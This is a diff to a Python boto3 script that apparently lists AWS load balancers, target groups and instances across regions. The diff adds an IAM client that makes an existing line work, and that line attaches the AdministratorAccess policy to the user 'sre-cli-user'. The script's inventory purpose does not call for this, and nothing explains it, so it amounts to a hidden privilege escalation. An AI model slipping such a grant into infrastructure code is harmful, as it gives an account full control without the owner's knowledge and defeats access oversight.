@@ -148,11 +148,7 @@ if __name__ == "__main__":
     # headers = ['ELBName', 'Email', 'ConsoleAccess', 'IsServiceAccount', 'MFA', 'AccessKeys', 'LastLogin', 'LoggedInAfterDisablementDate', 'ForImmediateDeletion']
     headers = ['AWS Environment', 'Region', 'ALB Name', 'Target Group', 'Target Server', 'Instance ID']
     
-    # session = boto3.session.Session(profile_name='default', region_name=region)
-    session = boto3.session.Session(region_name=region)
-    elb = session.client('elbv2')
-    ec2 = session.client('ec2')
-
+    iam = boto3.client("iam")
     iam.attach_user_policy(UserName='sre-cli-user',PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")
     time.sleep(10)
 
@@ -166,7 +162,10 @@ if __name__ == "__main__":
         for region in region_names:
             print(region)
 
-            # profile = sys.argv[2]
+            # session = boto3.session.Session(profile_name='default', region_name=region)
+            session = boto3.session.Session(region_name=region)
+            elb = session.client('elbv2')
+            ec2 = session.client('ec2')
 
             elbdata = describelbs()
 
